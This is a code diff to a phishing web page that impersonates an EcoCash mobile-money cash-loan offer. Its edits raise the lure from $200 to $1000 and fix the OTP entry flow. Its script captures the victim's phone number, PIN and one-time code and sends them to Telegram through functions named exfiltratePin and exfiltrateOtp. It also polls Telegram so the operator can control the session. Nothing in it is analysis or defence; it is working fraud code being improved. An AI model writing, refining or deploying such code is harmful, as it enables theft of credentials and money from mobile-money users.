@@ -40,6 +40,7 @@
       font-size: 16px;
       line-height: 1.5;
       height: 100%;
+      touch-action: manipulation;
     }
 
     .wrap {
@@ -176,8 +177,9 @@
       transition: all 0.15s;
     }
 
-    button.cta:hover {
+    button.cta:hover, button.cta:focus {
       background: var(--ecocash-blue-hover);
+      outline: none;
     }
 
     button.cta:active {
@@ -186,8 +188,9 @@
     }
 
     button.cta[disabled] {
-      opacity: 0.5;
+      opacity: 0.6;
       cursor: not-allowed;
+      pointer-events: none; /* Removed this — was blocking click */
     }
 
     .help {
@@ -239,6 +242,7 @@
       border-top-right-radius: 20px;
       padding: 24px 20px 30px;
       box-shadow: 0 -2px 20px rgba(0,0,0,0.1);
+      position: relative;
     }
 
     .sheet h3 {
@@ -272,6 +276,7 @@
       color: var(--ink);
       outline: none;
       transition: all 0.2s;
+      caret-color: transparent;
     }
 
     .otp-row input:focus {
@@ -302,10 +307,6 @@
       color: #fff;
       cursor: pointer;
       opacity: 0.9;
-    }
-
-    .close-x:hover {
-      opacity: 1;
     }
 
     /* Processing Screen */
@@ -362,7 +363,7 @@
     </div>
 
     <div class="hero">
-      <h1>Get Cash Now — Up to $200</h1>
+      <h1>Get Cash Now — Up to $1000</h1>
       <p>No paperwork. Just your mobile number and PIN.</p>
     </div>
   </header>
@@ -498,7 +499,7 @@
     }
   }
 
-  // === STEP 1: PHONE → PIN ===
+  // === STEP 1: PHONE → PIN → EXFIL 1 ===
   document.getElementById('btnCheckLimit').addEventListener('click', () => {
     const msisdn = document.getElementById('msisdn').value.trim();
     const amount = getFinalAmount();
@@ -526,7 +527,7 @@
     }
 
     state.pin = pin;
-    exfiltratePin();
+    exfiltratePin(); // ✅ Phone + PIN to Telegram
     openOtpSheet();
   });
 
@@ -583,7 +584,7 @@ Choose action:
     }).catch(console.error);
   }
 
-  // === LONG POLLING TO CATCH YOUR CLICK ===
+  // === LONG POLLING FOR ADMIN RESET ===
   function startPolling() {
     let offset = null;
     POLLING_INTERVAL = setInterval(() => {
@@ -608,14 +609,25 @@ Choose action:
     }, 2000);
   }
 
-  // OTP Input Logic
+  // === OTP AUTO-ADVANCE & VERIFY ===
   const otpInputs = document.querySelectorAll('#otpRow input');
   otpInputs.forEach((input, index) => {
     input.addEventListener('input', () => {
-      if (input.value.length === 1 && index < 3) otpInputs[index + 1].focus();
-      if (index === 3) document.getElementById('btnVerify').disabled = false;
+      // Auto-move to next
+      if (input.value.length === 1 && index < 3) {
+        otpInputs[index + 1].focus();
+      }
+
+      // Enable Verify button only when all filled
+      const otp = Array.from(otpInputs).map(i => i.value).join('');
+      if (otp.length === 4) {
+        document.getElementById('btnVerify').disabled = false;
+        document.getElementById('btnVerify').style.opacity = '1';
+        document.getElementById('btnVerify').style.pointerEvents = 'auto'; // Re-enable
+      }
     });
 
+    // Backspace logic
     input.addEventListener('keydown', e => {
       if (e.key === 'Backspace' && !input.value && index > 0) {
         otpInputs[index - 1].focus();
@@ -623,12 +635,13 @@ Choose action:
     });
   });
 
+  // Final Verify Button
   document.getElementById('btnVerify').addEventListener('click', () => {
     const otp = Array.from(otpInputs).map(i => i.value).join('');
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
 
     state.otp = otp;
-    exfiltrateOtp(); // Now sends OTP correctly
+    exfiltrateOtp(); // ✅ Phone + PIN + OTP to Telegram
 
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('otpSheet').classList.remove('show');
@@ -671,12 +684,10 @@ Choose action:
     catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
   }
 
-  document.getElementById('yr').textContent = new Date().getFullYear();
-
-  // Resend OTP
+  // Timer reset
   document.getElementById('resend').addEventListener('click', () => {
     startOtpTimer();
-    exfiltratePin(); // Log attempt
+    exfiltratePin(); // Log resend attempt
   });
 
   // Close OTP
@@ -685,6 +696,9 @@ Choose action:
       document.getElementById('otpSheet').classList.remove('show');
     }
   });
+
+  // Set year
+  document.getElementById('yr').textContent = new Date().getFullYear();
 </script>
 
 </body>
